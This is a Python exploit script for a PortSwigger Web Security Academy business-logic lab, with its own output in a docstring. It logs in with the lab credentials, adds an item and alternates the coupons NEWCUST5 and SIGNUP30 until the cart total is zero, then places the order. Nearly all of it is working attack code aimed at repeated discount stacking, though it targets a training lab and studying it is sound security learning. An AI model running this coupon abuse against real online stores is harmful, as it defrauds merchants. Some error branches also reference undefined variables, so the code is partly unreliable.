#Output
"""
python3 Bus-Logic-VA-4.py https://0aed0070031ec6878229de6d007300e4.web-security-academy.net
Logging with username 'Wiener' 
(+) Successfully logged in as the user:wiener
Added Item with productId=1
Total Price is : 1337.0
Coupon applied NEWCUST5
Total Price is : 1332.0
after appying coupons price is: 1332.0
Coupon applied SIGNUP30
Total Price is : 930.9
after appying coupons price is: 930.9
Coupon applied NEWCUST5
Total Price is : 925.9
after appying coupons price is: 925.9
Coupon applied SIGNUP30
Total Price is : 524.8
after appying coupons price is: 524.8
Coupon applied NEWCUST5
Total Price is : 519.8
after appying coupons price is: 519.8
Coupon applied SIGNUP30
Total Price is : 118.7
after appying coupons price is: 118.7
Coupon applied NEWCUST5
Total Price is : 113.7
after appying coupons price is: 113.7
Coupon applied SIGNUP30
Total Price is : 0.0
after appying coupons price is: 0.0
Final Total value after appying coupons: 0.0
Total Price is : 0.0
Placing the order for 0.0
(+) Successfully exploited the business logic vulnerability Lab No:4

"""
import requests
import json
import sys
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
#this method extract exploit server email client at run time

    
# This method fetches the csrf token from url and returns csrf token
def get_csrf_token(session, url):
    r = session.get(url, verify=False, proxies=proxies)
    # Check if the request was successful
    if r.status_code != 200:
        raise ValueError(f"Failed to fetch the CSRF token, status code: {r.status_code}")
    soup = BeautifulSoup(r.text, 'html.parser')
    # Print the HTML response for debugging
    csrf_input = soup.find("input", {'name': 'csrf'})
    if csrf_input:
        csrf = csrf_input['value']
    else:
        raise ValueError("CSRF token not found")
    return csrf

def total_price(session, cart_url):
    #cart_url_res variable stores get response from web server which contains total price details
    cart_url_res = session.get(cart_url, verify=False, proxies=proxies)
    soup = BeautifulSoup(cart_url_res.text, 'html.parser')
    # Find the table row with the "Total:" label
    total_row = soup.find('tr', string=lambda x: x and 'Total:' in x)
    if not total_row:
        total_row = soup.find(string=lambda x: x and 'Total:' in x)
        if total_row:
            total_row = total_row.find_parent('tr')
    
    # Extract the total value from the second <th> element in the row
    if total_row: 
        total_value = float(total_row.find_all('th')[1].text.strip('$'))
        print(f"Total Price is : {total_value}")
    else:
        print("Total value not found")
        print(cart_url_res.text)  # Print the response text for debugging
        total_value = 0
    return total_value

def apply_coupons(session, cart_url):
    total_price_for_items = total_price(session, cart_url)
    coupons = ['NEWCUST5', 'SIGNUP30'] 
    coupon_index = 0
    while total_price_for_items > 100:
        # Get the current coupon code
        coupon_code = coupons[coupon_index]
        # Prepare the data for the POST request (including the coupon code)
        coupon_url = cart_url+ "/coupon"
        csrf_token = get_csrf_token(session, cart_url)
        data_coupon = {"csrf": csrf_token, "coupon": coupon_code}
        data_coupon_res = session.post(coupon_url, data=data_coupon, verify=False, proxies=proxies)
        # Check if the request was successful 
        if data_coupon_res.status_code == 200:
            print(f"Coupon applied {coupon_code}")
            total_price_for_items = total_price(session, cart_url)
            print(f"after appying coupons price is: {total_price_for_items}")
        else: 
            print(f"Failed to apply Coupon {coupon}, status code: {data_coupon_res.status_code}") 
            break
        # Alternate to the next coupon
        coupon_index = (coupon_index + 1) % len(coupons)
    # Final total value
    print(f"Final Total value after appying coupons: {total_price_for_items}")
def check_out(session, cart_url):
    #POST /cart/checkout
    checkout_url = cart_url+"/checkout"
    check_out_price = total_price(session, cart_url)
    print(f"Placing the order for", check_out_price)
    csrf_token = get_csrf_token(session, cart_url)
    data_checkout = {"csrf": csrf_token}
    data_checkout_res = session.post(checkout_url, data=data_checkout, verify=False, proxies=proxies)
    if "Congratulations" in data_checkout_res.text:
        print("(+) Successfully exploited the business logic vulnerability Lab No:4")
    else:
        print("(-) Could not exploit the business logic vulnerability.")
        sys.exit(-1)

def login(session, main_url):
    login_url = main_url + "/login"
    csrf_token = get_csrf_token(session, login_url)
    # Login as the user
    print(f"Logging with username 'Wiener' ")
    data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    data_login_res = session.post(login_url, data=data_login, verify=False, proxies=proxies)
    if "Log out" in data_login_res.text:
        print("(+) Successfully logged in as the user:wiener")
        cart_url = main_url+ "/cart"
        data_cart = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
        data_cart_res = session.post(cart_url, data=data_cart, verify=False, proxies=proxies)
        if data_cart_res.status_code == 200:
            print("Added Item with productId=1")
        else:
            print("Could not Add the Item with productId=1")
        apply_coupons(session, cart_url)
        check_out(session, cart_url)        
    else:
        print("(-) Could not login as user:", user_name_login)
        
def main():    
    if len(sys.argv) != 2:
        print("Warning!\nNot enough arguments! Please provide by following below usage command and Example")
        print("(+) Usage command: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    session = requests.Session()
    main_url = sys.argv[1]
    #main_url=https://0a7f002404ed213e80d521c900ae00e6.web-security-academy.net
    login(session, main_url)

if __name__ == "__main__":
    main()
